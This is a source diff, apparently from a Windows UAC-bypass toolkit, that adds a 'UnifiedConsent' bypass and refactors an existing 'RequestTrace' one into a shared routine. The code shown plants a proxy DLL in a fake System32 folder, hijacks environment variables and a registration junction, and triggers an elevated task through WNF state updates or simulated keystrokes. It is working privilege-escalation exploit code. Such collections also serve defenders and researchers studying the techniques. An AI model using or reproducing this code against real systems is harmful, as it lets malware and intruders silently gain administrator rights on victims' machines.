@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.71
 *
-*  DATE:        19 Jul 2026
+*  DATE:        21 Jul 2026
 *
 *  UAC bypass methods from R41N3RZUF477.
 *
@@ -14,6 +14,7 @@
 *
 *  https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
 *  https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
+*  https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -32,20 +33,34 @@ BOOL ucmxTriggerTaskWNF(
     NTSTATUS status;
     ULONG info = 0;
 
-    status = NtQueryWnfStateNameInformation(state, WnfInfoStateNameExist, NULL, &info, sizeof(info));
-    if (!NT_SUCCESS(status))
-    {
+    status = NtQueryWnfStateNameInformation(state,
+        WnfInfoStateNameExist,
+        NULL,
+        &info,
+        sizeof(info));
+
+    if (!NT_SUCCESS(status)) {
         return FALSE;
     }
 
     info = 0;
-    status = NtQueryWnfStateNameInformation(state, WnfInfoSubscribersPresent, NULL, &info, sizeof(info));
-    if (!NT_SUCCESS(status))
-    {
+    status = NtQueryWnfStateNameInformation(state,
+        WnfInfoSubscribersPresent,
+        NULL,
+        &info,
+        sizeof(info));
+
+    if (!NT_SUCCESS(status)) {
         return FALSE;
     }
 
-    status = NtUpdateWnfStateData(state, NULL, 0, NULL, NULL, 0, 0);
+    status = NtUpdateWnfStateData(state,
+        NULL,
+        0,
+        NULL,
+        NULL,
+        0,
+        0);
 
     return NT_SUCCESS(status);
 }
@@ -128,32 +143,22 @@ BOOL ucmxDeleteRegistrationJunction(
     return FALSE;
 }
 
-/*
-* ucmRequestTraceMethod
-*
-* Purpose:
-*
-* Bypass UAC by environment variables hijack and dll planting.
-* https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
-*
-*/
-NTSTATUS ucmRequestTraceMethod(
+#define WNF_SHEL_TRACE_REQUESTED    0x0D83063EA3B8F075
+#define WNF_UC_CONSENT_ITEM_CHANGED 0x41C60D38A3BC0875
+
+NTSTATUS ucmRegistrationProxyExecute(
+    _In_ LPCWSTR ProxyDllName,
+    _In_ PWNF_STATE_NAME StateName,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL fDirCreated = FALSE;
-    BOOL fJunctionCreated = FALSE;
-    BOOL fEnvSet = FALSE;
-
+    BOOL fDirCreated = FALSE, fJunctionCreated = FALSE;
+    BOOL fEnvSet = FALSE, fUseSendInput = FALSE;
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
-    SIZE_T PayloadDirNameLen = 0, nLen;
-
+    SIZE_T nLen, payloadDirNameLen = 0;
     WCHAR szBuffer[MAX_PATH + 1];
     WCHAR szPayloadDir[MAX_PATH * 2];
-
-    WNF_STATE_NAME state;
-
     UNICODE_STRING uStrTaskhost = RTL_CONSTANT_STRING(TASKHOSTW_EXE);
 
     INPUT inputs[8];
@@ -174,8 +179,7 @@ NTSTATUS ucmRequestTraceMethod(
         //
         _strcpy(szPayloadDir, g_ctx->szTempDirectory);
         _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
-
-        PayloadDirNameLen = _strlen(szPayloadDir);
+        payloadDirNameLen = _strlen(szPayloadDir);
 
         if (!CreateDirectory(szPayloadDir, NULL)) {
             if (GetLastError() != ERROR_ALREADY_EXISTS)
@@ -188,7 +192,7 @@ NTSTATUS ucmRequestTraceMethod(
         // Drop payload.
         //
         _strcat(szPayloadDir, TEXT("\\"));
-        _strcat(szPayloadDir, PERFORMANCETRACEHANDLER_DLL);
+        _strcat(szPayloadDir, ProxyDllName);
 
         if (!supWriteBufferToFile(
             szPayloadDir,
@@ -224,50 +228,55 @@ NTSTATUS ucmRequestTraceMethod(
             (pfnEnumProcessCallback)supEnumTaskhostTasksCallback,
             (PVOID)&uStrTaskhost);
 
-        RtlSecureZeroMemory(inputs, sizeof(inputs));
+        fUseSendInput = (StateName->Value == WNF_SHEL_TRACE_REQUESTED);
 
         //
-        // Trigger task via WNF, if failed switch back to keyboard input.
+        // Trigger task via WNF
         //
-        state.Value = 0x0D83063EA3B8F075; //WNF_SHEL_TRACE_REQUESTED       
-        if (!ucmxTriggerTaskWNF(&state)) {
+        if (!ucmxTriggerTaskWNF(StateName)) {
 
             //
-            // Simulate Shift+Ctrl+Win+T.
+            // Trigger shell trace task by input.
             //
-            inputs[0].type = INPUT_KEYBOARD;
-            inputs[0].ki.wVk = VK_LSHIFT;
+            if (fUseSendInput) {
+                RtlSecureZeroMemory(inputs, sizeof(inputs));
 
-            inputs[1].type = INPUT_KEYBOARD;
-            inputs[1].ki.wVk = VK_LCONTROL;
+                //
+                // Simulate Shift+Ctrl+Win+T.
+                //
+                inputs[0].type = INPUT_KEYBOARD;
+                inputs[0].ki.wVk = VK_LSHIFT;
 
-            inputs[2].type = INPUT_KEYBOARD;
-            inputs[2].ki.wVk = VK_LWIN;
+                inputs[1].type = INPUT_KEYBOARD;
+                inputs[1].ki.wVk = VK_LCONTROL;
 
-            inputs[3].type = INPUT_KEYBOARD;
-            inputs[3].ki.wVk = 'T';
+                inputs[2].type = INPUT_KEYBOARD;
+                inputs[2].ki.wVk = VK_LWIN;
 
-            inputs[4].type = INPUT_KEYBOARD;
-            inputs[4].ki.wVk = 'T';
-            inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;
+                inputs[3].type = INPUT_KEYBOARD;
+                inputs[3].ki.wVk = 'T';
 
-            inputs[5].type = INPUT_KEYBOARD;
-            inputs[5].ki.wVk = VK_LWIN;
-            inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;
+                inputs[4].type = INPUT_KEYBOARD;
+                inputs[4].ki.wVk = 'T';
+                inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;
 
-            inputs[6].type = INPUT_KEYBOARD;
-            inputs[6].ki.wVk = VK_LCONTROL;
-            inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;
+                inputs[5].type = INPUT_KEYBOARD;
+                inputs[5].ki.wVk = VK_LWIN;
+                inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;
 
-            inputs[7].type = INPUT_KEYBOARD;
-            inputs[7].ki.wVk = VK_LSHIFT;
-            inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;
+                inputs[6].type = INPUT_KEYBOARD;
+                inputs[6].ki.wVk = VK_LCONTROL;
+                inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;
 
-            SendInput(RTL_NUMBER_OF(inputs), inputs, sizeof(INPUT));
+                inputs[7].type = INPUT_KEYBOARD;
+                inputs[7].ki.wVk = VK_LSHIFT;
+                inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;
+
+                SendInput(RTL_NUMBER_OF(inputs), inputs, sizeof(INPUT));
+            }
         }
 
         Sleep(5000);
-
         MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
@@ -288,7 +297,7 @@ NTSTATUS ucmRequestTraceMethod(
     //
     if (fDirCreated) {
         DeleteFile(szPayloadDir);
-        szPayloadDir[PayloadDirNameLen] = 0;
+        szPayloadDir[payloadDirNameLen] = 0;
         supRemoveDirectory(szPayloadDir);
     }
 
@@ -300,6 +309,46 @@ NTSTATUS ucmRequestTraceMethod(
     }
 
     return MethodResult;
+}
+
+/*
+* ucmUnifiedConsentMethod
+*
+* Purpose:
+*
+* Bypass UAC by environment variables hijack and dll planting.
+* https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
+*
+*/
+NTSTATUS ucmUnifiedConsentMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    WNF_STATE_NAME state;
+
+    state.Value = WNF_UC_CONSENT_ITEM_CHANGED;
+    return ucmRegistrationProxyExecute(UNIFIEDCONSENT_DLL, &state, ProxyDll, ProxyDllSize);
+}
+
+/*
+* ucmRequestTraceMethod
+*
+* Purpose:
+*
+* Bypass UAC by environment variables hijack and dll planting.
+* https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
+*
+*/
+NTSTATUS ucmRequestTraceMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    WNF_STATE_NAME state;
+
+    state.Value = WNF_SHEL_TRACE_REQUESTED;
+    return ucmRegistrationProxyExecute(PERFORMANCETRACEHANDLER_DLL, &state, ProxyDll, ProxyDllSize);
 }
 
 /*
@@ -452,15 +501,13 @@ NTSTATUS ucmQuickAssistMethod(
         // Run quick asssist.
         //
         hProcess = ucmxRunQuickAssist();
-        if (hProcess == NULL)
-            break;
-
-        if (WaitForSingleObject(hProcess, 15000) != WAIT_OBJECT_0) {
-            TerminateProcess(hProcess, 0);
+        if (hProcess) {
+            if (WaitForSingleObject(hProcess, 15000) != WAIT_OBJECT_0) {
+                TerminateProcess(hProcess, 0);
+            }
             CloseHandle(hProcess);
-            break;
         }
-        CloseHandle(hProcess);
+
         MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
